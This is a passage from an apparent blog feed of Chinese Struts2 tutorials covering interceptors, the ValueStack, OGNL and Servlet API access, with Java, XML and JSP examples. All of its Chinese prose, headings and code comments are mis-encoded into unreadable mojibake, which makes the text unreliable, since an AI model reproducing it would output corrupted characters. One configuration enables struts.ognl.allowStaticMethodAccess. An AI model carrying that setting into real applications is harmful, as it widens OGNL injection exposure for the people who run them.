å¦‚æœæœ‰ä¸‹ä¸€ä¸ªæ‹¦æˆªå™¨æ‰§è¡Œä¸‹ä¸€ä¸ªæ‹¦æˆªå™¨,æ²¡æœ‰çš„è¯æ‰§è¡ŒAction        System.out.println(&quot;InterceptorDemo2æ‰§è¡Œç»“æŸ---------------------&quot;);        return obj;     }}</code></pre><h2 id="åœ¨Struts2çš„é…ç½®æ–‡ä»¶ä¸­é…ç½®æ‹¦æˆªå™¨"><a href="#åœ¨Struts2çš„é…ç½®æ–‡ä»¶ä¸­é…ç½®æ‹¦æˆªå™¨" class="headerlink" title="åœ¨Struts2çš„é…ç½®æ–‡ä»¶ä¸­é…ç½®æ‹¦æˆªå™¨"></a>åœ¨Struts2çš„é…ç½®æ–‡ä»¶ä¸­é…ç½®æ‹¦æˆªå™¨</h2><pre><code>&lt;struts&gt;    &lt;!-- å¼€å¯Struts2çš„é™æ€æ–¹æ³•è®¿é—® --&gt;    &lt;constant name=&quot;struts.ognl.allowStaticMethodAccess&quot; value=&quot;true&quot;&gt;&lt;/constant&gt;    &lt;package name=&quot;demo1&quot; extends=&quot;struts-default&quot; namespace=&quot;/&quot;&gt;        &lt;!-- å®šä¹‰æ‹¦æˆªå™¨ --&gt;        &lt;interceptors&gt;            &lt;interceptor name=&quot;interceptorDemo1&quot; class=&quot;web.interceptor.InterceptorDemo1&quot;&gt;&lt;/interceptor&gt;            &lt;interceptor name=&quot;interceptorDemo2&quot; class=&quot;web.interceptor.InterceptorDemo2&quot;&gt;&lt;/interceptor&gt;        &lt;/interceptors&gt;        &lt;!-- åœ¨Actionä¸­å¼•å…¥è‡ªå®šä¹‰æ‹¦æˆªå™¨ --&gt;        &lt;action name=&quot;actionDemo1&quot; class=&quot;web.action.ActionDemo1&quot;&gt;            &lt;result&gt;/demo1/demo1.jsp&lt;/result&gt;            &lt;!-- ä¸€æ—¦å¼•å…¥äº†è‡ªå®šä¹‰æ‹¦æˆªå™¨,é»˜è®¤çš„æ‹¦æˆªå™¨æ ˆå°±ä¸æ‰§è¡Œäº†  --&gt;            &lt;interceptor-ref name=&quot;defaultStack&quot;&gt;&lt;/interceptor-ref&gt;        &lt;!-- é»˜è®¤æ ˆçš„æ‹¦æˆªå™¨ --&gt;            &lt;interceptor-ref name=&quot;interceptorDemo1&quot;&gt;&lt;/interceptor-ref&gt;            &lt;interceptor-ref name=&quot;interceptorDemo2&quot;&gt;&lt;/interceptor-ref&gt;        &lt;/action&gt;        &lt;!-- uiè¡¨å•demo --&gt;        &lt;action name=&quot;uiAction&quot; class=&quot;web.action.UiActionDemo&quot;&gt;            &lt;result name=&quot;input&quot;&gt;/demo2/demo3.jsp&lt;/result&gt;        &lt;/action&gt;    &lt;/package&gt;    &lt;!--      é…ç½®æ‹¦æˆªå™¨çš„ç¬¬äºŒç§æ–¹å¼:å®šä¹‰æ‹¦æˆªå™¨æ ˆ        &lt;interceptors&gt;            &lt;interceptor name=&quot;interceptorDemo1&quot; class=&quot;web.interceptor.InterceptorDemo1&quot;&gt;&lt;/interceptor&gt;            &lt;interceptor name=&quot;interceptorDemo2&quot; class=&quot;web.interceptor.InterceptorDemo2&quot;&gt;&lt;/interceptor&gt;            &lt;interceptor-stack name=&quot;myStack&quot;&gt;                &lt;interceptor-ref name=&quot;defaultStack&quot;&gt;&lt;/interceptor-ref&gt;                &lt;interceptor-ref name=&quot;interceptorDemo1&quot;&gt;&lt;/interceptor-ref&gt;                &lt;interceptor-ref name=&quot;interceptorDemo2&quot;&gt;&lt;/interceptor-ref&gt;            &lt;/interceptor-stack&gt;        &lt;/interceptors&gt;    --&gt;    &lt;!-- åœ¨Actionä¸­å¼•å…¥æ‹¦æˆªå™¨æ ˆ        &lt;action name=&quot;actionDemo1&quot; class=&quot;web.action.ActionDemo1&quot;&gt;            &lt;result&gt;/demo1/demo1.jsp&lt;/result&gt;            &lt;interceptor-ref name=&quot;myStack&quot;&gt;&lt;/interceptor-ref&gt;        &lt;/action&gt;    --&gt;&lt;/struts&gt;</code></pre><h2 id="è¾“å‡º"><a href="#è¾“å‡º" class="headerlink" title="è¾“å‡º"></a>è¾“å‡º</h2><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/DG4E1cExTeiQHbFKtx*S.gDdF1WG7UY6dEbfIRaFE8o!/b/dL8AAAAAAAAA&amp;bo=iAMUAgAAAAADF68!&amp;rf=viewer_4" alt="è‡ªå®šä¹‰æ‹¦æˆªå™¨è¾“å‡º"></p><h1 id="æ‹¦æˆªå™¨ä¸­çš„ç‰¹æ®Šæ ‡ç­¾Param"><a href="#æ‹¦æˆªå™¨ä¸­çš„ç‰¹æ®Šæ ‡ç­¾Param" class="headerlink" title="æ‹¦æˆªå™¨ä¸­çš„ç‰¹æ®Šæ ‡ç­¾Param"></a>æ‹¦æˆªå™¨ä¸­çš„ç‰¹æ®Šæ ‡ç­¾Param</h1><p>å…ˆä¸Šæ¡ˆä¾‹</p><pre><code>&lt;action name=&quot;user_*&quot; class=&quot;action.UserAction&quot; method=&quot;{1}&quot;&gt;            &lt;result name=&quot;success&quot;&gt;demo/Manage.jsp&lt;/result&gt;            &lt;!-- å¼•å…¥æ‹¦æˆªå™¨ --&gt;            &lt;interceptor-ref name=&quot;userInterceptor&quot;&gt;                &lt;param name=&quot;excludeMethods&quot;&gt;selectUser&lt;/param&gt;        &lt;!-- æ’é™¤æ‹¦æˆªå¦‚æœæœ‰å¤šä¸ªæ–¹æ³•ä¸æ‹¦æˆª,ç”¨é€—å·éš”å¼€å³å¯                è¿™é‡Œçš„æ–¹æ³•æŒ‡çš„æ˜¯UserActionä¸­çš„æ–¹æ³•Fuck                 --&gt;            &lt;/interceptor-ref&gt;            &lt;!-- å¼•å…¥é»˜è®¤æ‹¦æˆªå™¨,å¿…é¡»çš„. --&gt;            &lt;interceptor-ref name=&quot;defaultStack&quot;&gt;&lt;/interceptor-ref&gt;&lt;/action&gt;</code></pre><p><strong><interceptor-ref></interceptor-ref></strong>æ ‡ç­¾æœ‰ä¸ªåµŒå¥—æ ‡ç­¾<strong><param></strong>,<strong><param></strong>æ ‡ç­¾ä¸­æœ‰ä¸ª<strong>ç‰¹æ®Šå±æ€§excludeMethod</strong>,è¿™ä¸ªå±æ€§çš„ä½œç”¨æ˜¯å¯¹æŸä¸ªæ–¹æ³•ä¸è¿›è¡Œæ‹¦æˆª,è¿™é‡Œçš„æ–¹æ³•æŒ‡çš„æ˜¯Actionä¸­çš„æ–¹æ³•.å› ä¸ºåœ¨è¿™é‡Œæˆ‘çš„UserActionç±»ä¸­çš„æœ‰ä¸ªselectUseræ–¹æ³•,æ‰€ä»¥è¿™æ—¶å€™å½“Actionæ‰§è¡ŒselectUseræ–¹æ³•çš„æ—¶å€™,æ‹¦æˆªå™¨ä¸ä¼šå¯¹å…¶è¿›è¡Œæ‹¦æˆª.</p>]]></content>
      
      
      <categories>
          
          <category> Struts2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Struts2 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Struts2ä¸­çš„å€¼æ ˆ</title>
      <link href="/2018/12/22/struts2-zhong-de-zhi-zhan/"/>
      <url>/2018/12/22/struts2-zhong-de-zhi-zhan/</url>
      
        <content type="html"><![CDATA[<h1 id="Struts2å€¼æ ˆ"><a href="#Struts2å€¼æ ˆ" class="headerlink" title="Struts2å€¼æ ˆ"></a>Struts2å€¼æ ˆ</h1><h2 id="ä»€ä¹ˆæ˜¯å€¼æ ˆ"><a href="#ä»€ä¹ˆæ˜¯å€¼æ ˆ" class="headerlink" title="ä»€ä¹ˆæ˜¯å€¼æ ˆ"></a>ä»€ä¹ˆæ˜¯å€¼æ ˆ</h2><ul><li><strong>ValueStackç±»ä¼¼äºä¸€ä¸ªæ•°æ®ä¸­è½¬ç«™Struts2æ¡†æ¶ä¸­çš„æ•°æ®éƒ½ä¿å­˜åˆ°äº†ValueStackä¸­</strong><ul><li>ValueStackæ˜¯ä¸€ä¸ªæ¥å£,OgnlValueStackæ˜¯ä¸€ä¸ªValueStackæ¥å£çš„å®ç°ç±»</li><li>ValueStackè´¯ç©¿äº†Actionçš„æ•´ä¸ªç”Ÿå‘½å‘¨æœŸ(<strong>Actionä¸€æ—¦è¢«åˆ›å»º,Strutsæ¡†æ¶å°±ä¼šåˆ›å»ºä¸€ä¸ªå¯¹åº”çš„ValueStackå¯¹è±¡</strong>)</li><li><strong>Actionæ˜¯å¤šä¾‹çš„</strong></li></ul></li></ul><h2 id="å€¼æ ˆçš„å†…éƒ¨ç»“æ„"><a href="#å€¼æ ˆçš„å†…éƒ¨ç»“æ„" class="headerlink" title="å€¼æ ˆçš„å†…éƒ¨ç»“æ„"></a>å€¼æ ˆçš„å†…éƒ¨ç»“æ„</h2><p><img src="http://a3.qpic.cn/psb?/V10Lajvl1FgUNv/Y4jsx0aUcXm9HYWSnLbQiAuPahCHqPGdZoHs00yrrWQ!/b/dLoAAAAAAAAA&amp;ek=1&amp;kp=1&amp;pt=0&amp;bo=jAYyAwAAAAADN6k!&amp;tl=1&amp;vuin=726301387&amp;tm=1545451200&amp;sce=60-2-2&amp;rf=viewer_4" alt="å€¼æ ˆçš„å†…éƒ¨ç»“æ„"><br>ValueStackä¸­æœ‰ä¸¤ä¸ªåŒºåŸŸ</p><ul><li>rootåŒºåŸŸ:å†…éƒ¨æ˜¯ä¸ªArrayList,é‡Œé¢ä¸€èˆ¬æ”¾ç½®çš„æ˜¯å¯¹è±¡,<strong>è·å–Rootæ•°æ®ä¸éœ€è¦åŠ #ç¬¦å·</strong></li><li>ContextåŒºåŸŸ:å†…éƒ¨æ˜¯ä¸ªMap,é‡Œé¢æ”¾ç½®çš„æ˜¯webå¼€å‘ä¸­çš„å¸¸ç”¨çš„å¯¹è±¡æ•°æ®çš„å¼•ç”¨,<strong>è·å–contextæ•°æ®éœ€è¦åŠ #ç¬¦å·</strong><ul><li>root</li><li>request</li><li>session</li><li>application</li><li>parameters</li><li>attr</li></ul></li><li><strong>â€œæ“ä½œå€¼æ ˆâ€</strong>é€šå¸¸<strong>æŒ‡çš„æ˜¯æ“ä½œValueStrackä¸­çš„RootåŒºåŸŸ</strong>.</li></ul><h2 id="å€¼æ ˆä¸ActionContextçš„å…³ç³»"><a href="#å€¼æ ˆä¸ActionContextçš„å…³ç³»" class="headerlink" title="å€¼æ ˆä¸ActionContextçš„å…³ç³»"></a>å€¼æ ˆä¸ActionContextçš„å…³ç³»</h2><ul><li>ActionContext:Actionä¸Šä¸‹æ–‡<ul><li>é€šè¿‡æŸ¥çœ‹æºç å¾—çŸ¥:<strong>å½“è¯·æ±‚è¿‡æ¥çš„æ—¶å€™,æ‰§è¡Œè¿‡æ»¤å™¨ä¸­çš„doFilteræ–¹æ³•,åœ¨è¿™ä¸ªæ–¹æ³•ä¸­åˆ›å»ºActionContext,åœ¨åˆ›å»ºActioncontextçš„è¿‡ç¨‹ä¸­,ä¼šåˆ›å»ºValueStrackå¯¹è±¡,å¹¶ä¸”å°†ValueStrackå¯¹è±¡ä¼ é€’ç»™ActionContextå¯¹è±¡.æ‰€ä»¥å¯ä»¥é€šè¿‡ActionContextè·å–ValueStrack(å€¼æ ˆ)å¯¹è±¡</strong></li><li>ActionContextå¯¹è±¡ä¹‹æ‰€ä»¥èƒ½å¤Ÿè®¿é—®Servletçš„API(è®¿é—®åŸŸå¯¹è±¡çš„æ•°æ®),å› ä¸ºåœ¨å…¶å†…éƒ¨æœ‰å€¼æ ˆçš„å¼•ç”¨</li></ul></li><li>ServletContext:Servletä¸Šä¸‹æ–‡</li></ul><h2 id="è·å¾—å€¼æ ˆå¯¹è±¡"><a href="#è·å¾—å€¼æ ˆå¯¹è±¡" class="headerlink" title="è·å¾—å€¼æ ˆå¯¹è±¡"></a>è·å¾—å€¼æ ˆå¯¹è±¡</h2><ul><li>é€šè¿‡ActionContextå¯¹è±¡è·å–å€¼æ ˆ.</li><li>åœ¨Struts2å†…éƒ¨å°†å€¼æ ˆå­˜å…¥åˆ°Requestä¸­,æ‰€ä»¥è¿˜å¯ä»¥é€šè¿‡requestè·å–å€¼æ ˆ</li></ul><p>å®ä¾‹:</p><pre><code>public class ValueStackDemo2 extends ActionSupport {    /*     * åœ¨ä¸€ä¸ªActionå¯¹è±¡ä¸­åªä¼šåˆ›å»ºä¸€ä¸ªValueStrack     */    @Override    public String execute() throws Exception {        //ä¸€:é€šè¿‡Actioncontextè·å¾—å€¼æ ˆå¯¹è±¡        ValueStack valueStrack1 =  ActionContext.getContext().getValueStack();        //äºŒ:é€šè¿‡requestè·å¾—å€¼æ ˆå¯¹è±¡//        ServletActionContext.getRequest().getAttribute(&quot;struts.valueStrack&quot;);        ValueStack valueStrack2 = (ValueStack)ServletActionContext.getRequest().getAttribute(ServletActionContext.STRUTS_VALUESTACK_KEY);        System.out.println(valueStrack1 == valueStrack2);        return NONE;    }}</code></pre><h2 id="æ“ä½œå€¼æ ˆ-å‘å€¼æ ˆä¸­å­˜å…¥æ•°æ®"><a href="#æ“ä½œå€¼æ ˆ-å‘å€¼æ ˆä¸­å­˜å…¥æ•°æ®" class="headerlink" title="æ“ä½œå€¼æ ˆ(å‘å€¼æ ˆä¸­å­˜å…¥æ•°æ®)"></a>æ“ä½œå€¼æ ˆ(å‘å€¼æ ˆä¸­å­˜å…¥æ•°æ®)</h2><ol><li>åœ¨Actionä¸­æä¾›æ•°æ®çš„getæ–¹æ³•<ul><li>é»˜è®¤çš„æƒ…å†µä¸‹Strutsä¼šå°†Actionå¯¹è±¡å‹å…¥åˆ°å€¼æ ˆ.Actionçš„å±æ€§ä¹Ÿä¼šåœ¨å€¼æ ˆä¸­</li></ul></li><li>ä½¿ç”¨ValueStrackä¸­æœ¬èº«çš„æ–¹æ³•</li></ol><p>åœ¨Actionä¸­æä¾›æ•°æ®çš„getæ–¹æ³•</p><pre><code>public class ValueStackDemo3 extends ActionSupport {    private User user;    public User getUser() {        return user;    }    //å‘ValueStrackä¸­å­˜å€¼    @Override    public String execute() throws Exception {        user = new User(&quot;admin&quot;,&quot;admin&quot;);        return SUCCESS;    }</code></pre><p>ä½¿ç”¨ValueStackè‡ªå¸¦çš„æ–¹æ³•</p><pre><code>public class ValueStackDemo4 extends ActionSupport {    @Override    public String execute() throws Exception {        //å‘å€¼æ ˆä¸­ä¿å­˜æ•°æ®        //1:è·å¾—å€¼æ ˆå¯¹è±¡        ValueStack valueStack = ActionContext.getContext().getValueStack();        //2:ä½¿ç”¨push(Object)å’Œset(String key,Object obj)æ–¹æ³•å‘å€¼æ ˆä¸­å­˜å…¥å¯¹è±¡        User user = new User(&quot;admin&quot;,&quot;123456&quot;);        valueStack.push(user);        //å‹æ ˆ,åœ¨æ ˆçš„æœ€é¡¶ç«¯,åªè¦ä½¿ç”¨pushæ–¹æ³•é‚£ä¹ˆå­˜å…¥çš„å¯¹è±¡ä¸€å®šæ˜¯åœ¨æ ˆé¡¶        valueStack.set(&quot;name&quot;,&quot;å¼ ä¸‰&quot;);        //setæ–¹æ³•æ˜¯åˆ›å»ºäº†ä¸€ä¸ªmapé›†åˆ,ç„¶åå°†mapé›†åˆå‹å…¥åˆ°æ ˆä¸­        valueStack.set(&quot;age&quot;,88);        return super.execute();    }}</code></pre><h2 id="è·å–å€¼æ ˆä¸­çš„æ•°æ®"><a href="#è·å–å€¼æ ˆä¸­çš„æ•°æ®" class="headerlink" title="è·å–å€¼æ ˆä¸­çš„æ•°æ®"></a>è·å–å€¼æ ˆä¸­çš„æ•°æ®</h2><ul><li>è·å–rootä¸­çš„æ•°æ®(ä¸éœ€è¦åŠ #å·)  </li><li>è·å–Contextä¸­çš„æ•°æ®(éœ€è¦åŠ #å·)</li></ul><p>ä¾‹å­:</p><pre><code>&lt;!-- åœ¨Iteratoræ ‡ç­¾ä¸­å¦‚æœæ²¡å®šä¹‰varå±æ€§çš„è¯é‚£ä¹ˆåœ¨propertyæ ‡ç­¾ä¸­å¯ä»¥ä¸ç”¨å†™#,å¦‚æœå®šä¹‰äº†å°±å¿…é¡»å†™#å› ä¸ºä»–æ˜¯ä»å€¼æ ˆçš„contextåŒºåŸŸè¿›è¡Œå–å€¼çš„ --&gt; &lt;s:iterator var=&quot;c&quot; value=&quot;list&quot;&gt;    &lt;TR        style=&quot;FONT-WEIGHT: normal; FONT-STYLE: normal; BACKGROUND-COLOR: white; TEXT-DECORATION: none&quot;&gt;        &lt;TD&gt;&lt;s:property value=&quot;#c.cust_name&quot; /&gt;&lt;/TD&gt;        &lt;TD&gt;&lt;s:property value=&quot;#c.cust_level&quot; /&gt;&lt;/TD&gt;        &lt;TD&gt;&lt;s:property value=&quot;#c.cust_source&quot; /&gt;&lt;/TD&gt;        &lt;TD&gt;&lt;s:property value=&quot;#c.cust_industry&quot; /&gt;&lt;/TD&gt;        &lt;TD&gt;&lt;s:property value=&quot;#c.cust_phone&quot; /&gt;&lt;/TD&gt;        &lt;TD&gt;&lt;s:property value=&quot;#c.cust_mobile&quot; /&gt;&lt;/TD&gt;        &lt;TD&gt;&lt;a            href=&quot;${pageContext.request.contextPath }/customerServlet?method=edit&amp;custId=&lt;s:property value=&quot;#c.cust_id&quot;/&gt;&quot;&gt;ä¿®æ”¹&lt;/a&gt;            &amp;nbsp;&amp;nbsp; &lt;a            href=&quot;${pageContext.request.contextPath }/customerServlet?method=delete&amp;custId=&lt;s:property value=&quot;#c.cust_id&quot;/&gt;&quot;&gt;åˆ é™¤&lt;/a&gt;        &lt;/TD&gt;    &lt;/TR&gt;&lt;/s:iterator&gt;</code></pre><h2 id="ELä¸ºä»€ä¹ˆèƒ½è®¿é—®å€¼æ ˆä¸­çš„æ•°æ®"><a href="#ELä¸ºä»€ä¹ˆèƒ½è®¿é—®å€¼æ ˆä¸­çš„æ•°æ®" class="headerlink" title="ELä¸ºä»€ä¹ˆèƒ½è®¿é—®å€¼æ ˆä¸­çš„æ•°æ®"></a>ELä¸ºä»€ä¹ˆèƒ½è®¿é—®å€¼æ ˆä¸­çš„æ•°æ®</h2><ul><li>å› ä¸ºStruts2æ¡†æ¶çš„åº•å±‚å¯¹request.getAttribute()æ–¹æ³•è¿›è¡Œäº†å¢å¼º</li></ul><p>#OGNLä¸­çš„ç¬¦å·</p><h2 id="ä½¿ç”¨-å·æ„å»ºlistå’ŒMapé›†åˆ"><a href="#ä½¿ç”¨-å·æ„å»ºlistå’ŒMapé›†åˆ" class="headerlink" title="ä½¿ç”¨#å·æ„å»ºlistå’ŒMapé›†åˆ"></a>ä½¿ç”¨#å·æ„å»ºlistå’ŒMapé›†åˆ</h2><h2 id="å·"><a href="#å·" class="headerlink" title="%å·"></a>%å·</h2><ul><li>å¼ºåˆ¶è§£æOGNL</li><li>å¼ºåˆ¶ä¸è§£æOGNL</li></ul><h2 id="ç¬¦å·"><a href="#ç¬¦å·" class="headerlink" title="$ç¬¦å·"></a>$ç¬¦å·</h2><p>åœ¨é…ç½®æ–‡ä»¶ä¸­ä½¿ç”¨OGNL</p><ul><li>xml<ul><li>æ–‡ä»¶ä¸‹è½½</li></ul></li><li>å±æ€§æ–‡ä»¶<ul><li>å›½é™…åŒ–</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Struts2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Struts2 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>OGNL</title>
      <link href="/2018/12/22/ognl/"/>
      <url>/2018/12/22/ognl/</url>
      
        <content type="html"><![CDATA[<h1 id="OGNL"><a href="#OGNL" class="headerlink" title="OGNL"></a>OGNL</h1><h2 id="ä»€ä¹ˆæ˜¯OGNL"><a href="#ä»€ä¹ˆæ˜¯OGNL" class="headerlink" title="ä»€ä¹ˆæ˜¯OGNL"></a>ä»€ä¹ˆæ˜¯OGNL</h2><p><strong>å¯¹è±¡å›¾å¯¼èˆªè¯­è¨€ï¼ˆOGNLï¼‰</strong>æ˜¯ä¸€ç§ç”¨äºJavaçš„å¼€æºè¡¨è¾¾å¼è¯­è¨€ï¼ˆELï¼‰ï¼Œå®ƒä½¿ç”¨æ¯”Javaè¯­è¨€æ”¯æŒçš„å…¨éƒ¨èŒƒå›´æ›´ç®€å•çš„è¡¨è¾¾å¼ï¼Œå…è®¸è·å–å’Œè®¾ç½®å±æ€§ï¼ˆé€šè¿‡å®šä¹‰çš„setPropertyå’ŒgetPropertyï¼‰æ–¹æ³•ï¼Œåœ¨å‘ç°çš„JavaBeansï¼‰å’ŒJavaç±»çš„æ–¹æ³•æ‰§è¡Œã€‚å®ƒè¿˜å…è®¸æ›´ç®€å•çš„æ•°ç»„æ“ä½œã€‚</p><p>å®ƒçš„ç›®çš„æ˜¯åœ¨<strong>Java EEåº”ç”¨ç¨‹åºä¸­ä½¿ç”¨taglibä½œä¸ºè¡¨è¾¾å¼è¯­è¨€</strong>ã€‚</p><p><strong>ELå’ŒOGNLçš„åŒºåˆ«</strong></p><ul><li><p>OGNL:<strong>è°ƒç”¨å¯¹è±¡çš„æ–¹æ³•</strong>,<strong>è·å–Struts2å€¼æ ˆä¸­çš„æ•°æ®,OGNLæ˜¯ç¬¬ä¸‰æ–¹çš„è¡¨è¾¾å¼è¯­è¨€.</strong></p></li><li><p>EL:ä»åŸŸå¯¹è±¡ä¸­è·å–æ•°æ®,ä»<strong>ELçš„11ä¸ªå¯¹è±¡ä¸­è·å–</strong></p></li></ul><h2 id="OGNLçš„ä½¿ç”¨è¦ç´ "><a href="#OGNLçš„ä½¿ç”¨è¦ç´ " class="headerlink" title="OGNLçš„ä½¿ç”¨è¦ç´ "></a>OGNLçš„ä½¿ç”¨è¦ç´ </h2><ul><li>è¡¨è¾¾å¼</li><li>æ ¹å¯¹è±¡(Rootå¯¹è±¡)</li><li>Contextå¯¹è±¡</li></ul><h2 id="OGNLåœ¨Javaä¸­çš„ä½¿ç”¨"><a href="#OGNLåœ¨Javaä¸­çš„ä½¿ç”¨" class="headerlink" title="OGNLåœ¨Javaä¸­çš„ä½¿ç”¨"></a>OGNLåœ¨Javaä¸­çš„ä½¿ç”¨</h2><p><strong>ä¸‹é¢çš„ä»£ç å‡ä½¿ç”¨Junitè¿›è¡Œæµ‹è¯•è¿è¡Œ</strong></p><p>è·å–å¯¹è±¡çš„é™æ€æ–¹æ³•</p><pre><code>//è·å–å¯¹è±¡çš„é™æ€æ–¹æ³•    @Test    public void demo2() throws OgnlException{        //è·å¾—Context        OgnlContext context = new OgnlContext();        //è·å¾—æ ¹å¯¹è±¡        Object root = context.getRoot();        /*         * æ‰§è¡Œè¡¨è¾¾å¼         * è®¿é—®é™æ€æ–¹æ³•çš„æ–¹å¼:         * @ç±»å@æ–¹æ³•å         * @java.lang.Math@random()         */        Object obj = Ognl.getValue(&quot;@java.lang.Math@random()&quot;, context, root);        System.out.println(obj);    }</code></pre><p>ä½¿ç”¨OGNLè¡¨è¾¾å¼è°ƒç”¨å¯¹è±¡çš„æ–¹æ³•</p><pre><code>@Test    /*     * ä½¿ç”¨OGNLè¡¨è¾¾å¼è°ƒç”¨å¯¹è±¡çš„æ–¹æ³•     *      * æ³¨æ„:è¿™é‡Œä½¿ç”¨çš„æ˜¯Junitå¯¹æ–¹æ³•è¿›è¡Œçš„ä¸€ä¸ªæµ‹è¯• ä½¿ç”¨Junitçš„æ–¹æ³•: åœ¨æ–¹æ³•å¤´ä¸ŠåŠ ä¸Šä¸€ä¸ª@Testå³å¯     *      * @åœ¨Javaä¸­å¼æ³¨è§£çš„æ„æ€     */    public void demo1() throws OgnlException {        // è·å¾—Context        OgnlContext context = new OgnlContext();        // è·å¾—æ ¹å¯¹è±¡        Object root = context.getRoot();        // è·å–æ•°æ®(æ‰§è¡Œè¡¨è¾¾å¼)        Object obj = Ognl.getValue(&quot;&#39;helloWorld&#39;.length()&quot;, context, root);        System.out.println(obj);    }</code></pre><p>è·å¾—Rootä¸­çš„æ•°æ®</p><pre><code> // è·å–Rootä¸­çš„æ•°æ®ä¸éœ€è¦åŠ #åœ¨Struts2ä¸­éœ€è¦åŠ #    @Test    public void demo3() throws OgnlException{        //è·å¾—Context        OgnlContext context = new OgnlContext();        //å‘Rootä¸­å­˜æ”¾ä¸€ä¸ªå€¼        context.setRoot(new User(&quot;admin&quot;,&quot;admin&quot;));        //è·å¾—rootå¯¹è±¡        Object root = context.getRoot();        //æ‰§è¡Œè¡¨è¾¾å¼è·å–å®ä½“ç±»ä¸­çš„å€¼        Object username = Ognl.getValue(&quot;username&quot;, context, root);        Object password = Ognl.getValue(&quot;password&quot;, context, root);        System.out.println(username + &quot;\t&quot; + password);    }</code></pre><p>è·å¾—Contextä¸­çš„æ•°æ®</p><pre><code>//è·å–Contextä¸­çš„æ•°æ®éœ€è¦åŠ #å·    @Test    public void demo4() throws OgnlException{        //è·å¾—Context        OgnlContext context = new OgnlContext();        //è·å–rootå¯¹è±¡        Object root = context.getRoot();        //å‘contextä¸­å­˜å…¥æ•°æ®        context.put(&quot;name&quot;, &quot;è°¢æ–‡ä¸œ&quot;);        //è·å–contextä¸­çš„å€¼        Object obj = Ognl.getValue(&quot;#name&quot;, context, root);        System.out.println(obj);    }</code></pre><h2 id="OGNLåœ¨Struts2ä¸­çš„ä½¿ç”¨"><a href="#OGNLåœ¨Struts2ä¸­çš„ä½¿ç”¨" class="headerlink" title="OGNLåœ¨Struts2ä¸­çš„ä½¿ç”¨"></a>OGNLåœ¨Struts2ä¸­çš„ä½¿ç”¨</h2><p>è®¿é—®å¯¹è±¡çš„æ–¹æ³•</p><pre><code>&lt;!-- valueä¸­å†™OGNLè¡¨è¾¾å¼ --&gt;    &lt;p&gt;IlikeJavaçš„é•¿åº¦:&lt;s:property value=&quot;&#39;IlikeJava&#39;.length()&quot;/&gt;&lt;/p&gt;</code></pre><p>è®¿é—®å¯¹è±¡çš„é™æ€çš„æ–¹æ³•</p><pre><code>&lt;!-- Struts2é»˜è®¤ä¸èƒ½è®¿é—®é™æ€æˆå‘˜,éœ€è¦æ‰‹åŠ¨å¼€å¯ --&gt;    &lt;!-- struts.ognl.allowStaticMethodAccess=false --&gt;    &lt;p&gt;è°ƒç”¨å¯¹è±¡çš„é™æ€æ–¹æ³•:        &lt;s:property value=&quot;@java.lang.Math@random()&quot;/&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> Struts2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Struts2 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Struts2Servletçš„è®¿é—®</title>
      <link href="/2018/12/22/struts2servlet-de-fang-wen/"/>
      <url>/2018/12/22/struts2servlet-de-fang-wen/</url>
      
        <content type="html"><![CDATA[<h1 id="å®Œå…¨è§£è€¦åˆçš„æ–¹å¼"><a href="#å®Œå…¨è§£è€¦åˆçš„æ–¹å¼" class="headerlink" title="å®Œå…¨è§£è€¦åˆçš„æ–¹å¼"></a>å®Œå…¨è§£è€¦åˆçš„æ–¹å¼</h1><p>JSP</p><pre><code>&lt;h3 align=&quot;center&quot;&gt;æ–¹å¼ä¸€:å®Œå…¨è§£è€¦å’Œ&lt;/h3&gt;    &lt;form action=&quot;requestDemo1.action&quot; method=&quot;post&quot;&gt;        &lt;table align=&quot;center&quot;&gt;            &lt;tr&gt;                &lt;td&gt;å§“å:&lt;/td&gt;                &lt;td&gt;                &lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td&gt;å¯†ç :&lt;/td&gt;                &lt;td&gt;                &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;            &lt;tr&gt;                &lt;td colspan=&quot;2&quot;&gt;                &lt;input type=&quot;submit&quot; value=&quot;æäº¤&quot;&gt;                &lt;/td&gt;            &lt;/tr&gt;            &lt;/table&gt;    &lt;/form&gt;</code></pre><p>Action</p><pre><code>/* * è®¿é—®ServletApiçš„æ–¹å¼ä¸€:å®Œå…¨è§£è€¦å’Œ */public class RequestDemo1 extends ActionSupport {    @Override    public String execute() throws Exception {        //æ¥æ”¶å‚æ•°:åˆ©ç”¨Struts2ä¸­çš„å¯¹è±¡(ActionContext)        ActionContext context = ActionContext.getContext();            //è·å–å®ä¾‹        //è°ƒç”¨ActionContextçš„getParametersæ–¹æ³•        Map&lt;String,Object&gt; map = context.getParameters();        for(String key:map.keySet()){            String[] values = (String[])map.get(key);        //æ ¹æ®keyè·å–value            System.out.println(key+&quot;\t&quot;+Arrays.toString(values));        }        //å‘åŸŸå¯¹è±¡ä¸­å­˜å…¥æ•°æ®        context.put(&quot;reqName&quot;,&quot;reqValue&quot;);        //ç›¸å½“äºè°ƒç”¨äº†Request.setAttribute()//        Map&lt;String,Object&gt; request=(Map&lt;String, Object&gt;) context.get(&quot;request&quot;);//        request.put(&quot;reqName&quot;,&quot;reqValue&quot;);        //ç›¸å½“äºè°ƒç”¨äº†Request.setAttribute()        context.getSession().put(&quot;sessionName&quot;,&quot;sessionValue&quot;);        //ç›¸å½“äºSession.setAttribute()        context.getApplication().put(&quot;appName&quot;, &quot;appValue&quot;);        //ç›¸å½“äºapplication.setAttribute()        return SUCCESS;    }}</code></pre><h1 id="ä½¿ç”¨åŸç”Ÿçš„ServletAPI"><a href="#ä½¿ç”¨åŸç”Ÿçš„ServletAPI" class="headerlink" title="ä½¿ç”¨åŸç”Ÿçš„ServletAPI"></a>ä½¿ç”¨åŸç”Ÿçš„ServletAPI</h1><p>JSP</p><pre><code>&lt;h3 